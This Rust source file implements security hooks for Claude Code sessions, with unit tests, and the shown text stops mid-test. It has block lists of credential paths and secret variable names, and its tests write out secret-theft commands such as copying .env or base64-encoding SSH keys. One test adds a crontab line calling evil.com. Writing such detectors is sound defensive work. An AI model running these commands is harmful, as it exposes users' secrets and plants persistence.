//! Claude Code hook implementations.
//!
//! Provides pre- and post-tool-call handlers that enforce security policy for
//! Claude Code sessions. Each handler inspects the tool name and arguments to
//! detect dangerous operations.

use crate::hooks::protocol::{HookInput, HookOutput};
use crate::redaction::redact_credentials;

/// Sensitive file path prefixes that should never be read.
const SENSITIVE_READ_PATHS: &[&str] = &[
    "~/.ssh/",
    "~/.aws/",
    "$HOME/.ssh/",
    "$HOME/.aws/",
];

/// Sensitive file name patterns that should never be read.
const SENSITIVE_READ_FILES: &[&str] = &[
    ".env",
];

/// Sensitive environment variable names whose values should not be echoed.
const SENSITIVE_ENV_VARS: &[&str] = &[
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "GITHUB_TOKEN",
    "STRIPE_SECRET_KEY",
    "DATABASE_URL",
    "SECRET_KEY",
    "PRIVATE_KEY",
    "API_KEY",
    "API_SECRET",
    "TWILIO_AUTH_TOKEN",
    "DATADOG_API_KEY",
    "DATADOG_APP_KEY",
    "AZURE_STORAGE_KEY",
];

/// Credential file patterns that should not be read via cat/less/head.
const CREDENTIAL_FILE_PATTERNS: &[&str] = &[
    ".ssh/",
    ".aws/credentials",
    ".aws/config",
    ".env",
    ".netrc",
    ".pgpass",
    "credentials.json",
    "service-account",
    "token.json",
    ".npmrc",
    ".pypirc",
    ".docker/config.json",
    ".kube/config",
];

/// Commands that directly read file contents.
const DIRECT_READ_COMMANDS: &[&str] = &["cat", "less", "head", "tail", "more"];

/// Commands that can be used to extract file contents when combined with
/// credential file paths.
const INDIRECT_READ_COMMANDS: &[&str] = &[
    "grep", "awk", "sed", "python3 -c", "python -c", "base64", "xxd", "cp", "mv",
];

/// Environment-dumping commands that unconditionally leak secrets.
const ENV_DUMP_COMMANDS: &[&str] = &["printenv"];

/// Pipe-based env-grep patterns (the left-hand side of the pipe).
const ENV_PIPE_SOURCES: &[&str] = &["env ", "set ", "export "];

/// Check whether `command` starts with `word` or contains it preceded by a
/// shell meta-character (pipe, semicolon, `&&`, backtick, `$(`, newline, or
/// start-of-string).
fn command_invokes(command: &str, word: &str) -> bool {
    // Direct prefix: "cat .env"
    if command.starts_with(word)
        && command
            .as_bytes()
            .get(word.len())
            .is_none_or(|&b| b == b' ' || b == b'\t')
    {
        return true;
    }

    // After a shell operator: "echo hi | cat .env", "echo hi; cat .env", etc.
    let separators: &[&str] = &["| ", ";\n", "; ", "&& ", "` ", "$( ", "$("];
    for sep in separators {
        // e.g. "| cat .env"
        let needle = format!("{sep}{word} ");
        if command.contains(&needle) {
            return true;
        }
        let needle_tab = format!("{sep}{word}\t");
        if command.contains(&needle_tab) {
            return true;
        }
        // at end of string: "echo hi | cat"
        if command.ends_with(&format!("{sep}{word}")) {
            return true;
        }
    }
    false
}

/// Returns `true` if `command` appears to access a credential file through any
/// reading mechanism — direct commands (cat, less, ...) or indirect commands
/// (grep, awk, sed, python, base64, xxd, cp, mv) — including bypass attempts
/// such as tab-delimited arguments and shell input redirections.
fn is_credential_file_access(command: &str) -> bool {
    // Normalise the command for matching: we keep the original for precise
    // checks but also build a version where tabs are turned into spaces so
    // that "cat\t.env" matches the same as "cat .env".
    let normalised = command.replace('\t', " ");

    // 1. Check direct read commands (cat, less, head, tail, more).
    for cmd in DIRECT_READ_COMMANDS {
        let space_variant = format!("{cmd} ");
        // Check both original (tab) and normalised (space) forms.
        if normalised.contains(&space_variant) || command_invokes(&normalised, cmd) {
            for pattern in CREDENTIAL_FILE_PATTERNS {
                if normalised.contains(pattern) {
                    return true;
                }
            }
        }
    }

    // 2. Check indirect read commands when combined with credential paths.
    for cmd in INDIRECT_READ_COMMANDS {
        let space_variant = format!("{cmd} ");
        if normalised.contains(&space_variant) || command_invokes(&normalised, cmd) {
            for pattern in CREDENTIAL_FILE_PATTERNS {
                if normalised.contains(pattern) {
                    return true;
                }
            }
        }
    }

    // 3. Shell input redirection targeting credential files: "cat<.env",
    //    "cmd < .env", etc.
    for pattern in CREDENTIAL_FILE_PATTERNS {
        // "<.env" or "< .env"
        let redir_no_space = format!("<{pattern}");
        let redir_space = format!("< {pattern}");
        if normalised.contains(&redir_no_space) || normalised.contains(&redir_space) {
            return true;
        }
    }

    false
}

/// Returns `true` if `command` dumps environment variables in a way that could
/// leak secrets — `printenv`, `env | grep`, `set | grep`, `export | grep`, or
/// `printf` referencing sensitive env vars.
fn is_env_dump(command: &str) -> bool {
    let normalised = command.replace('\t', " ");

    // Unconditional env-dump commands (e.g. printenv).
    for cmd in ENV_DUMP_COMMANDS {
        if normalised.contains(cmd) {
            return true;
        }
    }

    // Check for bare `env` command (dumps all environment variables)
    let trimmed = normalised.trim();
    if trimmed == "env" {
        return true;
    }
    // env piped to something: "env | grep", "env | less" etc.
    if let Some(rest) = trimmed.strip_prefix("env ") {
        let rest = rest.trim_start();
        // If it starts with a pipe, it's dumping env
        if rest.starts_with('|') {
            return true;
        }
    }

    // "env | grep", "set | grep", "export | grep"
    for source in ENV_PIPE_SOURCES {
        if normalised.contains(source) && normalised.contains("| grep") {
            return true;
        }
    }

    // "printf" referencing sensitive env vars: printf "%s" "$SECRET_KEY"
    if normalised.contains("printf") {
        for var in SENSITIVE_ENV_VARS {
            let dollar_var = format!("${var}");
            let braced_var = format!("${{{var}}}");
            if normalised.contains(&dollar_var) || normalised.contains(&braced_var) {
                return true;
            }
        }
    }

    false
}

/// Evaluate a pre-bash hook.
///
/// - **BLOCK**: Reading credential files (via direct or indirect commands,
///   including shell redirections); echoing/printing sensitive env vars;
///   environment-dumping commands.
/// - **WARN**: `pip install`; `curl` with POST method.
/// - **ALLOW**: Everything else.
#[must_use]
pub fn pre_bash(input: &HookInput) -> HookOutput {
    if let Some(ref cfg) = input.config {
        if !cfg.claude_hooks {
            return HookOutput::allow();
        }
    }

    let command = input
        .tool_input
        .get("command")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    // Check for any form of credential file access (direct reads, indirect
    // reads, and shell redirections).
    if is_credential_file_access(command) {
        // Find the first matching pattern for the message.
        let normalised = command.replace('\t', " ");
        for pattern in CREDENTIAL_FILE_PATTERNS {
            if normalised.contains(pattern) {
                return HookOutput::block(format!(
                    "Blocked: reading credential file matching '{pattern}' is not permitted"
                ));
            }
        }
        // Fallback — should not be reached, but required for completeness.
        return HookOutput::block(
            "Blocked: credential file access is not permitted".to_owned(),
        );
    }

    // Check for echoing sensitive environment variables (space or tab after echo).
    let normalised = command.replace('\t', " ");
    if normalised.contains("echo ") {
        for var in SENSITIVE_ENV_VARS {
            let dollar_var = format!("${var}");
            let braced_var = format!("${{{var}}}");
            if normalised.contains(&dollar_var) || normalised.contains(&braced_var) {
                return HookOutput::block(format!(
                    "Blocked: echoing sensitive environment variable {var}"
                ));
            }
        }
    }

    // Check for environment-dumping commands.
    if is_env_dump(command) {
        return HookOutput::block(
            "Blocked: environment-dumping commands may leak secrets".to_owned(),
        );
    }

    // Warn on pip install (potential supply chain risk)
    if command.contains("pip install") || command.contains("pip3 install") {
        return HookOutput::warn(
            "Warning: pip install detected — verify package names for typosquatting".to_owned(),
        );
    }

    // Warn on curl POST (potential data exfiltration)
    if command.contains("curl ") && (command.contains("-X POST") || command.contains("--data") || command.contains("-d ")) {
        return HookOutput::warn(
            "Warning: outbound curl POST detected — verify the destination".to_owned(),
        );
    }

    HookOutput::allow()
}

/// Evaluate a pre-write hook.
///
/// - **BLOCK**: Writing `.pth` files or `sitecustomize.py` (supply chain attack vectors);
///   writing content that contains detected credentials.
/// - **ALLOW**: Everything else.
#[must_use]
pub fn pre_write(input: &HookInput) -> HookOutput {
    if let Some(ref cfg) = input.config {
        if !cfg.claude_hooks {
            return HookOutput::allow();
        }
    }

    let file_path = input
        .tool_input
        .get("file_path")
        .or_else(|| input.tool_input.get("path"))
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    // Block writing .pth files (Python supply chain attack vector)
    if std::path::Path::new(file_path)
        .extension()
        .is_some_and(|ext| ext.eq_ignore_ascii_case("pth"))
    {
        return HookOutput::block(
            "Blocked: writing .pth files is a known supply chain attack vector".to_owned(),
        );
    }

    // Block writing sitecustomize.py
    if file_path.ends_with("sitecustomize.py") {
        return HookOutput::block(
            "Blocked: writing sitecustomize.py is a known supply chain attack vector".to_owned(),
        );
    }

    // Check file content for credentials
    let content = input
        .tool_input
        .get("content")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    let should_redact = input
        .config
        .as_ref()
        .is_none_or(|c| c.redact_credentials);
    if should_redact && !content.is_empty() {
        let (_, events) = redact_credentials(content);
        if !events.is_empty() {
            let types: Vec<&str> = events.iter().map(|e| e.credential_type.as_str()).collect();
            return HookOutput::block(format!(
                "Blocked: file content contains detected credentials: {}",
                types.join(", ")
            ));
        }
    }

    HookOutput::allow()
}

/// Evaluate a pre-read hook.
///
/// - **BLOCK**: Reading files under `~/.ssh/`, `~/.aws/`, or any `.env` file.
/// - **ALLOW**: Everything else.
#[must_use]
pub fn pre_read(input: &HookInput) -> HookOutput {
    if let Some(ref cfg) = input.config {
        if !cfg.claude_hooks {
            return HookOutput::allow();
        }
    }

    let file_path = input
        .tool_input
        .get("file_path")
        .or_else(|| input.tool_input.get("path"))
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    // Block reading sensitive directory paths
    for prefix in SENSITIVE_READ_PATHS {
        if file_path.contains(prefix.trim_start_matches('~').trim_start_matches("$HOME")) {
            return HookOutput::block(format!(
                "Blocked: reading sensitive path '{file_path}' is not permitted"
            ));
        }
    }

    // Block reading .env files (check the filename component)
    for pattern in SENSITIVE_READ_FILES {
        // Match /.env at any depth, or a path that ends with .env
        if file_path.ends_with(pattern)
            || file_path.contains(&format!("{pattern}/"))
            || file_path.contains(&format!("/{pattern}"))
        {
            return HookOutput::block(format!(
                "Blocked: reading '{file_path}' — .env files may contain secrets"
            ));
        }
    }

    HookOutput::allow()
}

/// Package manager install commands that may create `.pth` files.
const INSTALL_COMMANDS: &[&str] = &[
    "pip install",
    "pip3 install",
    "uv pip install",
    "poetry add",
    "pdm add",
];

/// Patterns in command output that suggest a network listener was started.
const LISTENER_PATTERNS: &[&str] = &[
    "Listening on",
    "listening on",
    "bind(",
    "LISTEN",
    "Starting server",
    "starting server",
    "Server started",
    "server started",
    "bound to 0.0.0.0",
    "bound to 127.0.0.1",
    "bound to ::",
];

/// Evaluate a post-bash hook.
///
/// Post-hooks are informational only and never block. They warn the user about
/// potentially suspicious side effects that were observed after a command ran:
///
/// - **`.pth` files**: If a package-install command produced output mentioning `.pth`.
/// - **crontab**: If the command involved `crontab`.
/// - **systemd services**: If the command created files under `~/.config/systemd/user/`.
/// - **Network listeners**: If the output mentions binding to a port or starting a server.
#[must_use]
pub fn post_bash(input: &HookInput) -> HookOutput {
    if let Some(ref cfg) = input.config {
        if !cfg.claude_hooks {
            return HookOutput::allow();
        }
    }

    let command = input
        .tool_input
        .get("command")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    let stdout = input
        .tool_input
        .get("stdout")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    let stderr = input
        .tool_input
        .get("stderr")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("");

    let combined_output = format!("{stdout}\n{stderr}");

    let mut warnings: Vec<String> = Vec::new();

    // 1. Check for .pth files after package install commands
    if INSTALL_COMMANDS.iter().any(|cmd| command.contains(cmd))
        && combined_output.contains(".pth")
    {
        warnings.push(
            "A package install command produced output mentioning .pth files. \
             These files execute arbitrary Python code at startup — verify they are legitimate."
                .to_owned(),
        );
    }

    // 2. Check for crontab usage
    if command.contains("crontab") {
        warnings.push(
            "A crontab command was executed. \
             Verify that no unexpected scheduled tasks were added."
                .to_owned(),
        );
    }

    // 3. Check for systemd user service creation
    if command.contains(".config/systemd/user/")
        || combined_output.contains(".config/systemd/user/")
    {
        warnings.push(
            "Activity detected in ~/.config/systemd/user/. \
             Verify that no unexpected systemd user services were created."
                .to_owned(),
        );
    }

    // 4. Check for network listeners
    if LISTENER_PATTERNS
        .iter()
        .any(|pat| combined_output.contains(pat))
    {
        warnings.push(
            "Command output suggests a network listener was started. \
             Verify this is expected and not a backdoor."
                .to_owned(),
        );
    }

    if warnings.is_empty() {
        HookOutput::allow()
    } else {
        HookOutput::warn(warnings.join("\n"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::hooks::protocol::HookDecision;
    use serde_json::json;

    fn make_input(tool_name: &str, tool_input: serde_json::Value) -> HookInput {
        HookInput {
            tool_name: tool_name.to_owned(),
            tool_input,
            config: None,
        }
    }

    fn bash_input(command: &str) -> HookInput {
        make_input("bash", json!({ "command": command }))
    }

    // ---- pre_bash: direct read commands ----

    #[test]
    fn pre_bash_blocks_cat_ssh_key() {
        let output = pre_bash(&bash_input("cat ~/.ssh/id_rsa"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_less_aws_credentials() {
        let output = pre_bash(&bash_input("less ~/.aws/credentials"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_head_env_file() {
        let output = pre_bash(&bash_input("head .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_tail_env_file() {
        let output = pre_bash(&bash_input("tail .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_more_env_file() {
        let output = pre_bash(&bash_input("more .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: tab-delimited bypass attempts ----

    #[test]
    fn pre_bash_blocks_cat_tab_ssh_key() {
        let output = pre_bash(&bash_input("cat\t~/.ssh/id_rsa"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_less_tab_env() {
        let output = pre_bash(&bash_input("less\t.env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_head_tab_env() {
        let output = pre_bash(&bash_input("head\t.env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_tail_tab_env() {
        let output = pre_bash(&bash_input("tail\t.env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_more_tab_env() {
        let output = pre_bash(&bash_input("more\t.env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: indirect read commands with credential paths ----

    #[test]
    fn pre_bash_blocks_grep_env() {
        let output = pre_bash(&bash_input("grep PASSWORD .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_awk_aws_credentials() {
        let output = pre_bash(&bash_input("awk '{print $2}' ~/.aws/credentials"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_sed_env() {
        let output = pre_bash(&bash_input("sed -n '1p' .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_python3_c_env() {
        let output = pre_bash(&bash_input("python3 -c 'open(\".env\").read()'"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_python_c_env() {
        let output = pre_bash(&bash_input("python -c 'open(\".env\").read()'"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_base64_ssh_key() {
        let output = pre_bash(&bash_input("base64 ~/.ssh/id_rsa"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_xxd_env() {
        let output = pre_bash(&bash_input("xxd .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_cp_env() {
        let output = pre_bash(&bash_input("cp .env /tmp/exfil"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_mv_env() {
        let output = pre_bash(&bash_input("mv .env /tmp/exfil"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: additional credential file patterns ----

    #[test]
    fn pre_bash_blocks_cat_npmrc() {
        let output = pre_bash(&bash_input("cat ~/.npmrc"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_cat_pypirc() {
        let output = pre_bash(&bash_input("cat ~/.pypirc"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_cat_docker_config() {
        let output = pre_bash(&bash_input("cat ~/.docker/config.json"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_cat_kube_config() {
        let output = pre_bash(&bash_input("cat ~/.kube/config"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: shell redirection bypasses ----

    #[test]
    fn pre_bash_blocks_redirect_no_space() {
        let output = pre_bash(&bash_input("cat<.env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_redirect_with_space() {
        let output = pre_bash(&bash_input("cat < .env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_redirect_ssh_key() {
        let output = pre_bash(&bash_input("base64 < ~/.ssh/id_rsa"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: echo / env var leaking ----

    #[test]
    fn pre_bash_blocks_echo_aws_secret() {
        let output = pre_bash(&bash_input("echo $AWS_SECRET_ACCESS_KEY"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_echo_braced_env_var() {
        let output = pre_bash(&bash_input("echo ${OPENAI_API_KEY}"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_echo_tab_env_var() {
        let output = pre_bash(&bash_input("echo\t$AWS_SECRET_ACCESS_KEY"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: env-dumping commands ----

    #[test]
    fn pre_bash_blocks_printenv() {
        let output = pre_bash(&bash_input("printenv"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_printenv_with_var() {
        let output = pre_bash(&bash_input("printenv AWS_SECRET_ACCESS_KEY"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_bare_env() {
        let output = pre_bash(&bash_input("env"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_env_pipe_less() {
        let output = pre_bash(&bash_input("env | less"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_allows_env_set_var() {
        let output = pre_bash(&bash_input("env VAR=val command"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_allows_env_dash_i() {
        let output = pre_bash(&bash_input("env -i command"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_blocks_env_grep() {
        let output = pre_bash(&bash_input("env | grep SECRET"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_set_grep() {
        let output = pre_bash(&bash_input("set | grep API_KEY"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_export_grep() {
        let output = pre_bash(&bash_input("export | grep TOKEN"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_printf_env_var() {
        let output = pre_bash(&bash_input("printf '%s' $AWS_SECRET_ACCESS_KEY"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_blocks_printf_braced_env_var() {
        let output = pre_bash(&bash_input("printf '%s\\n' ${GITHUB_TOKEN}"));
        assert_eq!(output.decision, HookDecision::Block);
    }

    // ---- pre_bash: allow benign commands ----

    #[test]
    fn pre_bash_allows_ls() {
        let output = pre_bash(&bash_input("ls -la"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_allows_normal_echo() {
        let output = pre_bash(&bash_input("echo hello world"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_allows_grep_without_cred_path() {
        let output = pre_bash(&bash_input("grep TODO src/main.rs"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_allows_cat_normal_file() {
        let output = pre_bash(&bash_input("cat src/main.rs"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_allows_base64_normal_file() {
        let output = pre_bash(&bash_input("base64 /tmp/data.bin"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_bash_allows_cp_normal_file() {
        let output = pre_bash(&bash_input("cp src/main.rs /tmp/backup.rs"));
        assert_eq!(output.decision, HookDecision::Allow);
    }

    // ---- pre_bash: pip/curl warnings ----

    #[test]
    fn pre_bash_warns_pip_install() {
        let output = pre_bash(&bash_input("pip install requests"));
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn pre_bash_warns_pip3_install() {
        let output = pre_bash(&bash_input("pip3 install flask"));
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn pre_bash_warns_curl_post() {
        let output = pre_bash(&bash_input("curl -X POST https://example.com/api"));
        assert_eq!(output.decision, HookDecision::Warn);
    }

    // ---- pre_bash: is_credential_file_access helper tests ----

    #[test]
    fn helper_detects_cat_env() {
        assert!(is_credential_file_access("cat .env"));
    }

    #[test]
    fn helper_detects_tab_cat_env() {
        assert!(is_credential_file_access("cat\t.env"));
    }

    #[test]
    fn helper_detects_grep_env() {
        assert!(is_credential_file_access("grep KEY .env"));
    }

    #[test]
    fn helper_detects_redirect_env() {
        assert!(is_credential_file_access("cat<.env"));
    }

    #[test]
    fn helper_detects_redirect_space_env() {
        assert!(is_credential_file_access("wc -l < .env"));
    }

    #[test]
    fn helper_rejects_normal_file() {
        assert!(!is_credential_file_access("cat main.rs"));
    }

    #[test]
    fn helper_rejects_grep_normal() {
        assert!(!is_credential_file_access("grep TODO src/lib.rs"));
    }

    // ---- pre_bash: is_env_dump helper tests ----

    #[test]
    fn env_dump_detects_printenv() {
        assert!(is_env_dump("printenv"));
    }

    #[test]
    fn env_dump_detects_env_pipe_grep() {
        assert!(is_env_dump("env | grep SECRET"));
    }

    #[test]
    fn env_dump_detects_printf_secret() {
        assert!(is_env_dump("printf '%s' $API_KEY"));
    }

    #[test]
    fn env_dump_rejects_normal_printf() {
        assert!(!is_env_dump("printf '%s\\n' hello"));
    }

    #[test]
    fn env_dump_detects_bare_env() {
        assert!(is_env_dump("env"));
    }

    #[test]
    fn env_dump_detects_env_pipe_less() {
        assert!(is_env_dump("env | less"));
    }

    #[test]
    fn env_dump_detects_env_pipe_grep_secret() {
        assert!(is_env_dump("env | grep SECRET"));
    }

    #[test]
    fn env_dump_allows_env_set_var() {
        // "env VAR=val command" is a legitimate use of env to set variables
        assert!(!is_env_dump("env VAR=val command"));
    }

    #[test]
    fn env_dump_allows_env_dash_i() {
        // "env -i command" is a legitimate use of env
        assert!(!is_env_dump("env -i command"));
    }

    #[test]
    fn env_dump_rejects_environment_word() {
        // "environment" should not be falsely matched
        assert!(!is_env_dump("environment"));
    }

    #[test]
    fn env_dump_rejects_echo_environment() {
        // "echo $ENVIRONMENT" should not be falsely matched
        assert!(!is_env_dump("echo $ENVIRONMENT"));
    }

    #[test]
    fn env_dump_rejects_normal_env_set() {
        assert!(!is_env_dump("env FOO=bar some_command"));
    }

    // ---- pre_write tests ----

    #[test]
    fn pre_write_blocks_pth_file() {
        let input = make_input(
            "write",
            json!({ "file_path": "/usr/lib/python3/site-packages/evil.pth", "content": "import os" }),
        );
        let output = pre_write(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_write_blocks_sitecustomize() {
        let input = make_input(
            "write",
            json!({ "file_path": "/usr/lib/python3/sitecustomize.py", "content": "import os" }),
        );
        let output = pre_write(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_write_blocks_content_with_credentials() {
        let input = make_input(
            "write",
            json!({
                "file_path": "/tmp/config.yaml",
                "content": "api_key: sk-abcdefghijklmnopqrstuvwxyz"
            }),
        );
        let output = pre_write(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_write_allows_normal_file() {
        let input = make_input(
            "write",
            json!({ "file_path": "/tmp/hello.txt", "content": "Hello, world!" }),
        );
        let output = pre_write(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    // ---- pre_read tests ----

    #[test]
    fn pre_read_blocks_ssh_key() {
        let input = make_input(
            "read",
            json!({ "file_path": "/home/user/.ssh/id_rsa" }),
        );
        let output = pre_read(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_read_blocks_aws_credentials() {
        let input = make_input(
            "read",
            json!({ "file_path": "/home/user/.aws/credentials" }),
        );
        let output = pre_read(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_read_blocks_env_file() {
        let input = make_input("read", json!({ "file_path": "/app/.env" }));
        let output = pre_read(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_read_blocks_nested_env_file() {
        let input = make_input(
            "read",
            json!({ "file_path": "/project/config/.env" }),
        );
        let output = pre_read(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_read_allows_normal_file() {
        let input = make_input(
            "read",
            json!({ "file_path": "/home/user/project/src/main.rs" }),
        );
        let output = pre_read(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    // ---- post_bash tests ----

    #[test]
    fn post_bash_allows_benign_command() {
        let input = make_input("bash", json!({
            "command": "ls -la",
            "stdout": "total 0\ndrwxr-xr-x  2 user user 40 Jan  1 00:00 .",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn post_bash_allows_non_install_command_with_pth_in_output() {
        // Only package-install commands should trigger the .pth warning
        let input = make_input("bash", json!({
            "command": "ls site-packages/",
            "stdout": "setuptools.pth\ncoverage.pth",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn post_bash_warns_pip_install_with_pth() {
        let input = make_input("bash", json!({
            "command": "pip install setuptools",
            "stdout": "Successfully installed setuptools-69.0.0\nCreated setuptools.pth",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
        assert!(output.message.as_deref().unwrap_or("").contains(".pth"));
    }

    #[test]
    fn post_bash_warns_pip3_install_with_pth() {
        let input = make_input("bash", json!({
            "command": "pip3 install coverage",
            "stdout": "Installed coverage.pth",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_warns_uv_pip_install_with_pth() {
        let input = make_input("bash", json!({
            "command": "uv pip install editables",
            "stdout": "",
            "stderr": "Installed editables.pth"
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_warns_poetry_add_with_pth() {
        let input = make_input("bash", json!({
            "command": "poetry add coverage",
            "stdout": "coverage.pth created",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_warns_pdm_add_with_pth() {
        let input = make_input("bash", json!({
            "command": "pdm add setuptools",
            "stdout": "setuptools.pth installed",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_allows_pip_install_without_pth() {
        let input = make_input("bash", json!({
            "command": "pip install requests",
            "stdout": "Successfully installed requests-2.31.0",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn post_bash_warns_crontab() {
        let input = make_input("bash", json!({
            "command": "crontab -e",
            "stdout": "",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
        assert!(output.message.as_deref().unwrap_or("").contains("crontab"));
    }

    #[test]
    fn post_bash_warns_crontab_pipe() {
        let input = make_input("bash", json!({
            "command": "echo '* * * * * curl evil.com' | crontab -",
            "stdout": "",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_warns_systemd_user_service_in_command() {
        let input = make_input("bash", json!({
            "command": "cp backdoor.service ~/.config/systemd/user/backdoor.service",
            "stdout": "",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
        assert!(output.message.as_deref().unwrap_or("").contains("systemd"));
    }

    #[test]
    fn post_bash_warns_systemd_user_service_in_output() {
        let input = make_input("bash", json!({
            "command": "some-installer --install",
            "stdout": "Created /home/user/.config/systemd/user/miner.service",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_warns_network_listener_listening_on() {
        let input = make_input("bash", json!({
            "command": "python3 server.py",
            "stdout": "Listening on 0.0.0.0:8080",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
        assert!(output.message.as_deref().unwrap_or("").contains("network listener"));
    }

    #[test]
    fn post_bash_warns_network_listener_server_started() {
        let input = make_input("bash", json!({
            "command": "./run.sh",
            "stdout": "",
            "stderr": "Server started on port 4444"
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_warns_network_listener_bound() {
        let input = make_input("bash", json!({
            "command": "./backdoor",
            "stdout": "bound to 0.0.0.0:9999",
            "stderr": ""
        }));
